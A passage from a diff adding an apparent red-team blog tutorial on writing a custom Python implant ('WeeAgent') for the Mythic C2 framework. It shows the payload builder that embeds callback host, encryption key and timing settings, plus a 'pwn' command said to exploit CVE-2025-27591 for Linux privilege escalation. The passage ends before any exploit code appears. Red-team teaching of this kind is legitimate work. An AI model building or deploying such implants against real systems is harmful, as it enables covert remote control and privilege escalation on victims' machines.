+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_to_python_literal</span>(self, value):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> isinstance(value, str):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> value
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> json<span style="color:#f92672">.</span>dumps(value)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;false&#34;</span>, <span style="color:#e6db74">&#34;False&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;true&#34;</span>, <span style="color:#e6db74">&#34;True&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;null&#34;</span>, <span style="color:#e6db74">&#34;None&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_apply_c2_parameter_replacements</span>(self, base_code: str, c2):
+</span></span><span style="display:flex;"><span>        params <span style="color:#f92672">=</span> c2<span style="color:#f92672">.</span>get_parameters_dict()
+</span></span><span style="display:flex;"><span>        replacements <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;callback_host&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;callback_host&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;callback_port&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;callback_port&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;post_uri&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;post_uri&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;get_uri&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;get_uri&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;query_path_name&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;query_path_name&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;proxy_host&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;proxy_host&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;proxy_user&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;proxy_user&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;proxy_pass&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;proxy_pass&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;proxy_port&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;proxy_port&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;callback_interval&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;callback_interval&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;callback_jitter&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;callback_jitter&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;killdate&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;killdate&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;AESPSK&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;AESPSK&#34;</span>, {}),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;encrypted_exchange_check&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;encrypted_exchange_check&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;HEADER_PLACEHOLDER&#34;</span>: params<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;headers&#34;</span>, {}),
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> placeholder, value <span style="color:#f92672">in</span> replacements<span style="color:#f92672">.</span>items():
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> placeholder <span style="color:#f92672">in</span> base_code:
+</span></span><span style="display:flex;"><span>                base_code <span style="color:#f92672">=</span> base_code<span style="color:#f92672">.</span>replace(placeholder, self<span style="color:#f92672">.</span>_to_python_literal(value))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> base_code
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">build</span>(self) <span style="color:#f92672">-&gt;</span> BuildResponse:
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># this function gets called to create an instance of your payload</span>
+</span></span><span style="display:flex;"><span>        resp <span style="color:#f92672">=</span> BuildResponse(status<span style="color:#f92672">=</span>BuildStatus<span style="color:#f92672">.</span>Success)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># create the payload</span>
+</span></span><span style="display:flex;"><span>        build_msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            command_code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> cmd <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>commands<span style="color:#f92672">.</span>get_commands():
+</span></span><span style="display:flex;"><span>                command_path <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>getPythonVersionFile(self<span style="color:#f92672">.</span>agent_code_path, cmd)
+</span></span><span style="display:flex;"><span>                command_code <span style="color:#f92672">+=</span> self<span style="color:#f92672">.</span>_read_file(command_path) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            selected_c2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> c2 <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>c2info:
+</span></span><span style="display:flex;"><span>                profile_name <span style="color:#f92672">=</span> c2<span style="color:#f92672">.</span>get_c2profile()[<span style="color:#e6db74">&#34;name&#34;</span>]
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> profile_name <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;http&#34;</span>:
+</span></span><span style="display:flex;"><span>                    selected_c2 <span style="color:#f92672">=</span> c2
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> selected_c2 <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>                build_msg <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;No supported C2 profile selected for </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(self<span style="color:#f92672">.</span>name)
+</span></span><span style="display:flex;"><span>                resp<span style="color:#f92672">.</span>set_status(BuildStatus<span style="color:#f92672">.</span>Error)
+</span></span><span style="display:flex;"><span>                resp<span style="color:#f92672">.</span>build_stderr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Error building payload: &#34;</span> <span style="color:#f92672">+</span> build_msg
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> resp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            profile_name <span style="color:#f92672">=</span> selected_c2<span style="color:#f92672">.</span>get_c2profile()[<span style="color:#e6db74">&#34;name&#34;</span>]
+</span></span><span style="display:flex;"><span>            base_code <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_get_base_code_for_profile(profile_name)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            base_code <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_apply_https_setting(base_code, profile_name)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            crypto_code <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_read_file(self<span style="color:#f92672">.</span>getPythonVersionFile(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(self<span style="color:#f92672">.</span>agent_code_path, <span style="color:#e6db74">&#34;base_agent&#34;</span>), <span style="color:#e6db74">&#34;crypto_lib&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            base_code <span style="color:#f92672">=</span> base_code<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;CRYPTO_HERE&#34;</span>, crypto_code)
+</span></span><span style="display:flex;"><span>            base_code <span style="color:#f92672">=</span> base_code<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;UUID_HERE&#34;</span>, self<span style="color:#f92672">.</span>uuid)
+</span></span><span style="display:flex;"><span>            base_code <span style="color:#f92672">=</span> base_code<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;#COMMANDS_HERE&#34;</span>, command_code)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            base_code <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_apply_c2_parameter_replacements(base_code, selected_c2)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> build_msg <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span>:
+</span></span><span style="display:flex;"><span>                resp<span style="color:#f92672">.</span>build_stderr <span style="color:#f92672">=</span> build_msg
+</span></span><span style="display:flex;"><span>                resp<span style="color:#f92672">.</span>set_status(BuildStatus<span style="color:#f92672">.</span>Error)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">await</span> SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+</span></span><span style="display:flex;"><span>                PayloadUUID<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>uuid,
+</span></span><span style="display:flex;"><span>                StepName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Gathering Files&#34;</span>,
+</span></span><span style="display:flex;"><span>                StepStdout<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Found all files for payload&#34;</span>,
+</span></span><span style="display:flex;"><span>                StepSuccess<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>            ))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>get_parameter(<span style="color:#e6db74">&#34;output&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;base64&#34;</span>:
+</span></span><span style="display:flex;"><span>                resp<span style="color:#f92672">.</span>payload <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(base_code<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>                resp<span style="color:#f92672">.</span>build_message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Successfully Built&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                resp<span style="color:#f92672">.</span>payload <span style="color:#f92672">=</span> base_code<span style="color:#f92672">.</span>encode()
+</span></span><span style="display:flex;"><span>                resp<span style="color:#f92672">.</span>build_message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Successfully built!&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            resp<span style="color:#f92672">.</span>set_status(BuildStatus<span style="color:#f92672">.</span>Error)
+</span></span><span style="display:flex;"><span>            resp<span style="color:#f92672">.</span>build_stderr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Error building payload: &#34;</span> <span style="color:#f92672">+</span> str(e)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> resp
+</span></span></code></pre></div><p><em>note : your defined class needs to extend the <code>PayloadType</code> class</em></p>
+<p>Let&rsquo;s break this down part by part :</p>
+<h4 id="class-definition--metadata">Class Definition &amp; Metadata</h4>
+<p>The first thing you&rsquo;ll notice is the class itself :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">WeeAgent</span>(PayloadType):
+</span></span><span style="display:flex;"><span>    name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;WeeAgent&#34;</span>
+</span></span><span style="display:flex;"><span>    file_extension <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;py&#34;</span>
+</span></span><span style="display:flex;"><span>    author <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;@Yassine-elhammoumi&#34;</span>
+</span></span><span style="display:flex;"><span>    supported_os <span style="color:#f92672">=</span> [SupportedOS<span style="color:#f92672">.</span>Linux, SupportedOS<span style="color:#f92672">.</span>Windows]
+</span></span><span style="display:flex;"><span>    wrapper <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    mythic_encrypts <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    c2_profiles <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;http&#34;</span>]
+</span></span></code></pre></div><p>This is basically the identity card of your agent. Mythic reads all of these fields to register it in the UI. A couple things worth noting here :</p>
+<ul>
+<li><code>mythic_encrypts = True</code> means we&rsquo;re offloading AES encryption to Mythic itself, so we don&rsquo;t have to implement it in the implant</li>
+<li><code>c2_profiles = [&quot;http&quot;]</code> ties the agent to the http profile, meaning it won&rsquo;t be buildable without it selected</li>
+</ul>
+<h4 id="build-parameters">Build Parameters</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>build_parameters <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    BuildParameter(name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;output&#34;</span>, <span style="color:#f92672">...</span>),
+</span></span><span style="display:flex;"><span>    BuildParameter(name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;python_version&#34;</span>, <span style="color:#f92672">...</span>),
+</span></span><span style="display:flex;"><span>    BuildParameter(name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https_check&#34;</span>, <span style="color:#f92672">...</span>)
+</span></span><span style="display:flex;"><span>]
+</span></span></code></pre></div><p>These are the options the operator sees when generating a payload from the UI. Three things we&rsquo;re exposing here :</p>
+<ul>
+<li><strong>output</strong> : raw <code>.py</code> or base64 encoded blob</li>
+<li><strong>python_version</strong> : determines which file variant gets picked up at build time</li>
+<li><strong>https_check</strong> : whether to skip TLS verification, useful when working behind a self-signed cert</li>
+</ul>
+<h4 id="path-configuration">Path Configuration</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>agent_path <span style="color:#f92672">=</span> pathlib<span style="color:#f92672">.</span>Path(<span style="color:#e6db74">&#34;.&#34;</span>) <span style="color:#f92672">/</span> <span style="color:#e6db74">&#34;weeagent&#34;</span> <span style="color:#f92672">/</span> <span style="color:#e6db74">&#34;mythic&#34;</span>
+</span></span><span style="display:flex;"><span>agent_icon_path <span style="color:#f92672">=</span> agent_path <span style="color:#f92672">/</span> <span style="color:#e6db74">&#34;weeagent.svg&#34;</span>
+</span></span><span style="display:flex;"><span>agent_code_path <span style="color:#f92672">=</span> pathlib<span style="color:#f92672">.</span>Path(<span style="color:#e6db74">&#34;.&#34;</span>) <span style="color:#f92672">/</span> <span style="color:#e6db74">&#34;weeagent&#34;</span> <span style="color:#f92672">/</span> <span style="color:#e6db74">&#34;agent_code&#34;</span>
+</span></span></code></pre></div><p>Nothing fancy here. We&rsquo;re just telling the builder where to find everything. Keeping them relative makes the container portable.</p>
+<h4 id="getpythonversionfile">getPythonVersionFile()</h4>
+<p>A small utility that resolves the right file variant based on the selected Python version. It first looks for a generic <code>.py</code>, then falls back to <code>.py2</code> or <code>.py3</code>. This lets us keep version specific implementations without polluting the main build logic.</p>
+<h4 id="the-transport-template-system">The Transport Template System</h4>
+<p>This is where things get interesting. Instead of hardcoding the HTTP logic directly into the agent, the transport layer is templated and injected at build time. Four methods handle this :</p>
+<ul>
+<li><code>_get_base_code_for_profile()</code> loads the core agent template and the matching transport file for the selected C2 profile</li>
+<li><code>_parse_transport_template()</code> splits the transport file into four named sections using <code>### SECTION ###</code> markers : <code>IMPORTS</code>, <code>CLASS_FIELDS</code>, <code>FUNCTIONS</code>, <code>CONFIG</code></li>
+<li><code>_validate_transport_template_format()</code> makes sure no markers are missing or duplicated</li>
+<li><code>_validate_transport_sections()</code> enforces that <code>FUNCTIONS</code> and <code>CONFIG</code> are non-empty, since those are the bare minimum for a working transport</li>
+</ul>
+<p>The base agent core uses placeholder strings like <code>TRANSPORT_IMPORTS</code>, <code>TRANSPORT_FUNCTIONS</code> and so on, which get swapped out with the parsed sections.</p>
+<p>The nice thing about this design is that adding support for a new C2 profile is as simple as dropping in a new <code>transport_&lt;profile&gt;.py3</code> file. No touching the core agent needed.</p>
+<hr>
+<h4 id="_apply_c2_parameter_replacements">_apply_c2_parameter_replacements()</h4>
+<p>Once the transport is injected, this method does a second pass of string replacements to bake in the actual C2 parameters : callback host, port, URIs, jitter, kill date, the AES PSK and headers.</p>
+<p>Everything gets embedded directly into the final script. No external config file, the implant is fully self-contained.</p>
+<hr>
+<h4 id="the-build-method">The build() Method</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">build</span>(self) <span style="color:#f92672">-&gt;</span> BuildResponse:
+</span></span></code></pre></div><p>This is the entry point Mythic calls when generating a payload. The flow goes like this :</p>
+<ol>
+<li>Iterate over registered commands and concatenate their source into one block</li>
+<li>Select the <code>http</code> profile from <code>c2info</code></li>
+<li>Load and assemble the base agent through the transport template system</li>
+<li>Inject the crypto library at <code>CRYPTO_HERE</code></li>
+<li>Replace <code>UUID_HERE</code> with the payload&rsquo;s unique UUID</li>
+<li>Inject commands at <code>#COMMANDS_HERE</code></li>
+<li>Apply all C2 parameter replacements</li>
+<li>Return raw <code>.py</code> or base64 depending on the <code>output</code> build parameter</li>
+</ol>
+<p>If anything breaks along the way, the exception gets caught and handed back to Mythic as a <code>BuildStatus.Error</code> with a descriptive message. On success, we get a clean <code>BuildStatus.Success</code> with the final payload bytes.</p>
+<h2 id="making-our-own-command">Making Our Own Command</h2>
+<p>There&rsquo;s a plethora of commands available online written in any language you&rsquo;d like to use, check out <a href="https://github.com/MythicMeta/MythicContainer">MythicContainer</a> for more information. But for this part, we&rsquo;ll be implementing our own command that leverages CVE-2025-27591 to elevate privileges, read more <a href="https://yassine-elhammoumi.github.io/posts/cve_2025_27591/">here</a>.</p>
+<p>Of course, in this case we&rsquo;ll be using python (there&rsquo;s a <a href="https://red-team-sncf.github.io/how-to-create-your-own-mythic-agent-in-c.html">C tutorial</a> by the ONCF red team that I found informative if you&rsquo;re interested in that).</p>
+<h3 id="command-definition">Command Definition</h3>
+<p>First, you&rsquo;ll need to create a file that defines your command inside the mythic ecosystem, it needs to be inside <code>mythic/agent_functions</code> as specified by the <code>build.py</code> file. I named mine <strong>pwn</strong> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> mythic_container.MythicCommandBase <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> mythic_container.MythicRPC <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">PwnArguments</span>(TaskArguments):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, command_line, <span style="color:#f92672">**</span>kwargs):
+</span></span><span style="display:flex;"><span>        super()<span style="color:#f92672">.</span>__init__(command_line, <span style="color:#f92672">**</span>kwargs)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>args <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parse_arguments</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">PwnCommand</span>(CommandBase):
+</span></span><span style="display:flex;"><span>    cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;pwn&#34;</span>
+</span></span><span style="display:flex;"><span>    needs_admin <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    help_cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;pwn&#34;</span>
+</span></span><span style="display:flex;"><span>    description <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;This exploits cve_2025_27591 to elevate privileges&#34;</span>
+</span></span><span style="display:flex;"><span>    version <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    author <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;@Yassine-elhammoumi&#34;</span>
+</span></span><span style="display:flex;"><span>    attackmapping <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;T1068&#34;</span>]
+</span></span><span style="display:flex;"><span>    argument_class <span style="color:#f92672">=</span> PwnArguments
+</span></span><span style="display:flex;"><span>    attributes <span style="color:#f92672">=</span> CommandAttributes(
+</span></span><span style="display:flex;"><span>        supported_python_versions<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;Python 2.7&#34;</span>, <span style="color:#e6db74">&#34;Python 3.8&#34;</span>],
+</span></span><span style="display:flex;"><span>        supported_os<span style="color:#f92672">=</span>[ SupportedOS<span style="color:#f92672">.</span>Linux ]
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_tasking</span>(self, task: MythicTask) <span style="color:#f92672">-&gt;</span> MythicTask:
+</span></span><span style="display:flex;"><span>        task<span style="color:#f92672">.</span>display_params <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;CVE-2025-27591&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> MythicRPC()<span style="color:#f92672">.</span>create_message(
+</span></span><span style="display:flex;"><span>            task_id<span style="color:#f92672">=</span>task<span style="color:#f92672">.</span>Task<span style="color:#f92672">.</span>ID,
+</span></span><span style="display:flex;"><span>            message<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;[i] Attempting privilege escalation via Below (CVE-2025-27591)&#34;</span>
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> task
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">process_response</span>(self, task: PTTaskMessageAllData, response: any) <span style="color:#f92672">-&gt;</span> PTTaskProcessResponseMessageResponse:
+</span></span><span style="display:flex;"><span>        output <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;output&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>        resp <span style="color:#f92672">=</span> PTTaskProcessResponseMessageResponse(TaskID<span style="color:#f92672">=</span>task<span style="color:#f92672">.</span>Task<span style="color:#f92672">.</span>ID, Success<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>        resp<span style="color:#f92672">.</span>UserOutput <span style="color:#f92672">=</span> output
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> resp
+</span></span></code></pre></div><h4 id="pwnarguments">PwnArguments</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">PwnArguments</span>(TaskArguments):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, command_line, <span style="color:#f92672">**</span>kwargs):
+</span></span><span style="display:flex;"><span>        super()<span style="color:#f92672">.</span>__init__(command_line, <span style="color:#f92672">**</span>kwargs)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>args <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parse_arguments</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span></code></pre></div><p>Every command needs an arguments class that extends <code>TaskArguments</code>. Since our exploit doesn&rsquo;t need any input from the operator, we keep <code>self.args</code> empty and leave <code>parse_arguments()</code> as a no-op. Simple as that.</p>
+<h4 id="pwncommand-metadata">PwnCommand Metadata</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">PwnCommand</span>(CommandBase):
+</span></span><span style="display:flex;"><span>    cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;pwn&#34;</span>
+</span></span><span style="display:flex;"><span>    needs_admin <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    attackmapping <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;T1068&#34;</span>]
+</span></span><span style="display:flex;"><span>    attributes <span style="color:#f92672">=</span> CommandAttributes(
+</span></span><span style="display:flex;"><span>        supported_python_versions<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;Python 2.7&#34;</span>, <span style="color:#e6db74">&#34;Python 3.8&#34;</span>],
+</span></span><span style="display:flex;"><span>        supported_os<span style="color:#f92672">=</span>[ SupportedOS<span style="color:#f92672">.</span>Linux ]
+</span></span><span style="display:flex;"><span>    )
+</span></span></code></pre></div><p>This is the identity block for our command, similar to what we saw in the builder. A couple things worth noting here :</p>
+<ul>
+<li><code>needs_admin = False</code> since the whole point is to get to admin through the exploit itself</li>
+<li><code>attackmapping = [&quot;T1068&quot;]</code> ties the command to the MITRE ATT&amp;CK technique for exploitation of privilege escalation vulnerabilities</li>
+<li><code>supported_os = [SupportedOS.Linux]</code> restricts the command to Linux only, since CVE-2025-27591 is a Linux specific vulnerability</li>
+</ul>
+<h4 id="create_tasking">create_tasking()</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_tasking</span>(self, task: MythicTask) <span style="color:#f92672">-&gt;</span> MythicTask:
+</span></span><span style="display:flex;"><span>    task<span style="color:#f92672">.</span>display_params <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;CVE-2025-27591&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> MythicRPC()<span style="color:#f92672">.</span>create_message(
